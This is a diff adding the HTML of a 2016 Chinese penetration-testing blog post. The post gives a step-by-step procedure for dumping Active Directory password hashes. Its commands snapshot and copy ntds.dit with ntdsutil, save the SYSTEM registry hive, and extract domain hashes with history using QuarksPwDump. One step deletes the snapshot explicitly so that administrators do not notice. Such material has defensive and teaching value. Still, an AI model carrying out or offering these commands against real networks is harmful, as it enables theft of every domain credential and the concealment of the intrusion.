@@ -1,0 +1,277 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <!--Description-->
+    
+        <meta name="description" content="知道自己想要做什么,比怎么做更重要">
+    
+
+    <!--Author-->
+    
+        <meta name="author" content="klion">
+    
+
+    <!--Open Graph Title-->
+    
+        <meta property="og:title" content="完整导出域内用户hash小记 [ ntdsutil + QuarksPwDump ]"/>
+    
+
+    <!--Open Graph Description-->
+    
+        <meta property="og:description" content="知道自己想要做什么,比怎么做更重要" />
+    
+
+    <!--Open Graph Site Name-->
+    <meta property="og:site_name" content="klion&#39;s blog"/>
+
+    <!--Type page-->
+    
+        <meta property="og:type" content="article" />
+    
+
+    <!--Page Cover-->
+    
+
+    <meta name="twitter:card" content="summary" />
+    
+
+    <!-- Title -->
+    
+    <title>完整导出域内用户hash小记 [ ntdsutil + QuarksPwDump ] - klion&#39;s blog</title>
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">
+
+    <!-- Custom Fonts -->
+    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- Gallery -->
+    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet" />
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/style.css">
+
+    <!-- Google Analytics -->
+    
+
+
+</head>
+
+
+<body>
+
+<div class="bg-gradient"></div>
+<div class="bg-pattern"></div>
+
+<!-- Menu -->
+<!--Menu Links and Overlay-->
+<div class="menu-bg">
+    <div class="menu-container">
+        <ul>
+            
+            <li class="menu-item">
+                <a href="/">
+                    主页
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/archives">
+                    所有文章
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/about">
+                    关于自己
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/tags">
+                    标签
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/categories">
+                    分类
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/contact">
+                    一起交流
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+</div>
+
+<!--Hamburger Icon-->
+<nav>
+    <a href="#menu"></a>
+</nav>
+
+<div class="container">
+
+    <!-- Main Content -->
+    <div class="row">
+    <div class="col-sm-12">
+
+        <!--Title and Logo-->
+        <header>
+    <div class="logo">
+        <a href="/"><i class="logo-icon fa fa-cube" aria-hidden="true"></i></a>
+        
+    </div>
+</header>
+
+        <section class="main">
+            
+<div class="post">
+
+    <div class="post-header">
+        <h1 class="title">
+            <a href="/2016/08/14/ntdsutil-quarkspwdump/">
+                完整导出域内用户hash小记 [ ntdsutil + QuarksPwDump ]
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2016-08-14</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/domainhash/">domainhash</a>
+                </span>
+            
+        </div>
+    </div>
+
+    <div class="content">
+
+        <!-- Gallery -->
+        
+
+        <!-- Post Content -->
+        <p><br></p>
+<h4 id="自己在实际渗透中这种方法用的相对比较多-方便快捷-ntdsutil-ad数据库的命令行管理工具-利用它我们可以快速手工创建快照导出域内用户数据库-像这样的操作-实际渗透中还是不要交互的好-所以下面会全部都以非交互的方式来进行"><a href="#自己在实际渗透中这种方法用的相对比较多-方便快捷-ntdsutil-ad数据库的命令行管理工具-利用它我们可以快速手工创建快照导出域内用户数据库-像这样的操作-实际渗透中还是不要交互的好-所以下面会全部都以非交互的方式来进行" class="headerlink" title="自己在实际渗透中这种方法用的相对比较多[方便快捷],ntdsutil[ad数据库的命令行管理工具],利用它我们可以快速手工创建快照导出域内用户数据库),像这样的操作,实际渗透中还是不要交互的好,所以下面会全部都以非交互的方式来进行:"></a>自己在实际渗透中这种方法用的相对比较多[方便快捷],ntdsutil[ad数据库的命令行管理工具],利用它我们可以快速手工创建快照导出域内用户数据库),像这样的操作,实际渗透中还是不要交互的好,所以下面会全部都以非交互的方式来进行:</h4><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ntdsutil + QuarksPwDump</div></pre></td></tr></table></figure>
+<p><br><br>第一步:创建快照<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ntdsutil snapshot <span class="string">"activate instance ntds"</span> create quit quit</div></pre></td></tr></table></figure></p>
+<p><img src="/img/ntdsutil snapshot.png" alt=""><br></p>
+<p>第二步:挂载刚才生成好的快照:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ntdsutil snapshot <span class="string">"mount &#123;793a0923-1a83-428b-8860-535fb2b2866a&#125;"</span> quit quit</div></pre></td></tr></table></figure></p>
+<p><img src="/img/ntdsutil mount.png" alt=""><br><br><img src="/img/ntdsutil mount res.png" alt=""><br></p>
+<p>第三步:把导出的ntds数据库复制到指定位置<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">copy <span class="symbol">C:</span>\$SNAP_201705211114_VOLUMEC$\windows\ntds\ntds.dit <span class="symbol">c:</span>\ntds.dit</div></pre></td></tr></table></figure></p>
+<p><img src="/img/ntdsutil copy.png" alt=""><br></p>
+<p>第四步:删除快照,还是要注意千万别忘了,被管理发现始终不太好<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ntdsutil snapshot <span class="string">"unmount &#123;793a0923-1a83-428b-8860-535fb2b2866a&#125;"</span> <span class="string">"delete &#123;793a0923-1a83-428b-8860-535fb2b2866a&#125;"</span> quit quit</div></pre></td></tr></table></figure></p>
+<p><img src="/img/ntdsutil unmount.png" alt=""><br></p>
+<p>第五步:开始利用QuarksPwDump提取账户hash<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">reg save hklm\system system.hiv  提取syskey,这里就直接放到当前目录下了,等会儿提取hash要用</div><div class="line">QuarksPwDump.exe --dump-hash-domain --with-history --ntds-file <span class="symbol">c:</span>\ntds.dit --system-file <span class="symbol">c:</span>\system.hiv -o <span class="symbol">c:</span>\pass.txt</div></pre></td></tr></table></figure></p>
+<p><img src="/img/ntdsutil hash.png" alt=""><br></p>
+
+    </div>
+
+    
+
+    
+        <div class="post-tags">
+            <i class="fa fa-tags" aria-hidden="true"></i>
+            <a href="/tags/domainhash/">#domainhash</a>
+        </div>
+    
+
+    <!-- Comments -->
+    
+
+</div>
+        </section>
+
+    </div>
+</div>
+
+</div>
+
+<!-- Footer -->
+<div class="push"></div>
+
+<footer class="footer-content">
+    <div class="container">
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <ul class="list-inline footer-social-icons">
+                    
+                    <li class="list-inline-item">
+                        <a href="https://github.com/klionsec">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-github"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="mailto:klionsec@gmail.com">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-envelope-o"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                </ul>
+            </div>
+        </div>
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <div class="footer-copyright">
+                    <h2>blog by klion</h2>
+                </div>
+            </div>
+        </div>
+    </div>
+</footer>
+
+
+<!-- After footer scripts -->
+
+<!-- jQuery -->
+<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>
+
+<!-- Tween Max -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>
+
+<!-- Gallery -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>
+
+<!-- Custom JavaScript -->
+<script src="/js/main.js"></script>
+
+<!-- Disqus Comments -->
+
+
+
+</body>
+
+</html>
